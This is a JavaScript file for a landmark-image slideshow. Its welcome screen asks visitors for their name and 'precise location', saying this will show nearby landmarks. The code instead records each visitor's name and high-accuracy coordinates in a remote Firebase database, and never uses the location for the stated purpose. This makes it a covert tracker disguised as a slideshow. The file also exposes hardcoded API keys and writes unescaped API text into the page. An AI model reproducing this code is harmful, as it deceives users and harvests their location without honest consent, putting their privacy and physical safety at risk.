const accessKey = 'nnzYM_D-RwaiEJnWZlBQHhjX2qptAEZTl4u01DyosgI';
const numberOfImages = 50;
let currentSlide = 0;
let images = [];
let viewerName = '';

function showWelcomeScreen() {
    const welcomeDiv = document.createElement('div');
    welcomeDiv.id = 'welcome-screen';
    welcomeDiv.innerHTML = `
        <div class="welcome-content">
            <h2>Welcome to the Slideshow</h2>
            <input type="text" id="nameInput" placeholder="Enter your name" />
            <p>To provide the best experience, we need access to your precise location. This will help us show nearby landmarks.</p>
            <button id="enterBtn">Enter</button>
        </div>
    `;
    document.body.appendChild(welcomeDiv);

    // Add Firebase configuration at the top
    const firebaseConfig = {
        apiKey: "AIzaSyAYyhwvbR0j05AzO5CKq_YvQ6Sa_2ZqPF0",
        authDomain: "scenery-burst.firebaseapp.com",
        databaseURL: "https://scenery-burst-default-rtdb.firebaseio.com",
        projectId: "scenery-burst",
        storageBucket: "scenery-burst.firebasestorage.app",
        messagingSenderId: "676260138190",
        appId: "1:676260138190:web:0f942d17e9d7d82be5549f"
    };
    
    // Initialize Firebase
    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();
    
    // Modify the enter button click handler in showWelcomeScreen
    const enterBtn = document.getElementById('enterBtn');
    enterBtn.addEventListener('click', async () => {
        viewerName = document.getElementById('nameInput').value.trim();
        if (viewerName) {
            try {
                const position = await getPreciseLocation();
                const { latitude, longitude, accuracy } = position.coords;
                
                console.log('Exact Location:', {
                    latitude: latitude.toFixed(6),
                    longitude: longitude.toFixed(6),
                    accuracy: `${accuracy} meters`
                });

                // Save data to Firebase
                const visitorRef = database.ref('visitors').push();
                visitorRef.set({
                    name: viewerName,
                    location: { 
                        latitude: latitude.toFixed(6),
                        longitude: longitude.toFixed(6),
                        accuracy: accuracy
                    },
                    timestamp: firebase.database.ServerValue.TIMESTAMP
                });

                document.body.removeChild(welcomeDiv);
            } catch (error) {
                console.error('Error getting location:', error);
                // Handle case where user denies permission
                const visitorRef = database.ref('visitors').push();
                visitorRef.set({
                    name: viewerName,
                    timestamp: firebase.database.ServerValue.TIMESTAMP
                });
                document.body.removeChild(welcomeDiv);
            }
        }
    });
}

function showLeafletMap(latitude, longitude) {
    const mapDiv = document.createElement('div');
    mapDiv.id = 'map';
    mapDiv.style.height = '400px';
    mapDiv.style.margin = '20px 0';
    document.body.appendChild(mapDiv);

    // Initialize Leaflet map
    const map = L.map('map').setView([latitude, longitude], 15);

    // Add OpenStreetMap tiles
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
    }).addTo(map);

    // Add marker
    L.marker([latitude, longitude]).addTo(map)
        .bindPopup('Your Location')
        .openPopup();
}

function getPreciseLocation() {
    return new Promise((resolve, reject) => {
        if (navigator.geolocation) {
            const options = {
                enableHighAccuracy: true,  // Request high accuracy
                timeout: 5000,            // Maximum wait time
                maximumAge: 0             // Don't use cached position
            };
            
            navigator.geolocation.getCurrentPosition(resolve, reject, options);
        } else {
            reject(new Error('Geolocation is not supported by this browser.'));
        }
    });
}

function showMap(latitude, longitude) {
    const mapDiv = document.createElement('div');
    mapDiv.id = 'map';
    mapDiv.style.height = '400px';
    mapDiv.style.margin = '20px 0';
    document.body.appendChild(mapDiv);

    // Initialize Google Maps
    const map = new google.maps.Map(mapDiv, {
        center: { lat: latitude, lng: longitude },
        zoom: 15
    });

    // Add marker
    new google.maps.Marker({
        position: { lat: latitude, lng: longitude },
        map: map,
        title: 'Your Location'
    });
}

// Modify fetchImages to show welcome screen first
async function fetchImages() {
    showWelcomeScreen();
    try {
        const response = await fetch(
            `https://api.unsplash.com/photos/random?count=${numberOfImages}&query=landmarks&client_id=${accessKey}`
        );
        images = await response.json();
        displayImages();
        showSlide(currentSlide);
    } catch (error) {
        console.error('Error fetching images:', error);
    }
}

function showSlide(index) {
    const slides = document.querySelectorAll('.slide');
    if (slides.length > 0) {
        slides.forEach(slide => slide.classList.remove('active'));
        slides[index].classList.add('active');
    }
}

async function getEnhancedDescription(location, basicDescription) {
    // Predefined landmark information
    const landmarkInfo = {
        'Eiffel Tower': `The Eiffel Tower, located in Paris, France, stands as an iconic symbol of romance and engineering brilliance. 
        Completed in 1889, this 324-meter iron lattice tower was originally built for the World's Fair. 
        It attracts over 7 million visitors annually, making it the most visited paid monument globally. 
        The tower features three levels accessible to visitors, with restaurants on the first and second floors. 
        At night, it sparkles with thousands of lights, creating a magical display every hour. 
        The structure was initially meant to be temporary and was saved from demolition due to its utility as a radio antenna. 
        Its innovative design has inspired countless replicas worldwide. 
        The tower offers breathtaking views of Paris from its observation decks. 
        During World War II, it played a crucial role in radio communications. 
        Today, it remains a masterpiece of architectural achievement and French cultural identity.`,
        
        'Taj Mahal': `The Taj Mahal, located in Agra, India, is a stunning white marble mausoleum built between 1632 and 1653. 
        Emperor Shah Jahan commissioned this architectural marvel in memory of his beloved wife, Mumtaz Mahal. 
        The structure perfectly combines Persian, Ottoman, and Indian architectural styles. 
        Its distinctive four minarets and central dome have become instantly recognizable worldwide. 
        The marble changes color throughout the day, from pink in the morning to white at noon and golden in moonlight. 
        The intricate inlay work features precious and semi-precious stones from around the world. 
        The surrounding gardens follow perfect symmetry, reflecting Islamic garden design principles. 
        It took over 20,000 artisans and workers to complete this magnificent structure. 
        The Taj Mahal is considered one of the finest examples of Mughal architecture. 
        UNESCO designated it as a World Heritage Site in 1983.`
        // Add more landmark information as needed
    };

    // Try to match location with predefined info, otherwise generate a generic description
    let detailedInfo = landmarkInfo[location];
    if (!detailedInfo) {
        detailedInfo = `This remarkable location, ${location}, stands as a testament to human creativity and natural beauty. 
        ${basicDescription || 'This stunning landmark'} captures the imagination of visitors from around the world. 
        The site has become a popular destination for travelers and photography enthusiasts alike. 
        Its unique characteristics make it stand out among other landmarks in the region. 
        The location offers visitors a chance to experience local culture and history firsthand. 
        Weather conditions and lighting can dramatically change its appearance throughout the day. 
        Visitors often recommend spending several hours exploring the various viewpoints. 
        The site has inspired numerous artists and photographers over the years. 
        Local traditions and customs are deeply connected to this location. 
        It continues to be preserved for future generations to appreciate and enjoy.`;
    }

    return detailedInfo;
}

function displayImages() {
    const slideshow = document.getElementById('slideshow');
    
    images.forEach(async (image, index) => {
        const slide = document.createElement('div');
        slide.className = 'slide';
        
        const container = document.createElement('div');
        container.className = 'image-container';

        const img = document.createElement('img');
        img.src = image.urls.regular;
        img.alt = image.alt_description || 'Landmark image';

        const infoDiv = document.createElement('div');
        infoDiv.className = 'image-info';
        
        const location = image.location.name || 'Location unknown';
        const basicDescription = image.description || image.alt_description || 'No description available';
        
        // Get enhanced description
        const enhancedDescription = await getEnhancedDescription(location, basicDescription);

        infoDiv.innerHTML = `
            <h3>${location}</h3>
            <p>${enhancedDescription}</p>
        `;

        container.appendChild(img);
        slide.appendChild(container);
        slide.appendChild(infoDiv);
        slideshow.appendChild(slide);
    });

    setupNavigation();
}

function setupNavigation() {
    // Add click navigation
    document.addEventListener('click', (e) => {
        // Go to next slide when clicking anywhere
        currentSlide = (currentSlide + 1) % images.length;
        showSlide(currentSlide);
    });

    // Keep keyboard navigation as alternative
    document.addEventListener('keydown', (e) => {
        if (e.key === 'ArrowLeft') {
            currentSlide = (currentSlide - 1 + images.length) % images.length;
            showSlide(currentSlide);
        } else if (e.key === 'ArrowRight') {
            currentSlide = (currentSlide + 1) % images.length;
            showSlide(currentSlide);
        }
    });

    // Add automatic slideshow
    setInterval(() => {
        currentSlide = (currentSlide + 1) % images.length;
        showSlide(currentSlide);
    }, 4000); // 4000 milliseconds = 4 seconds
}

fetchImages();
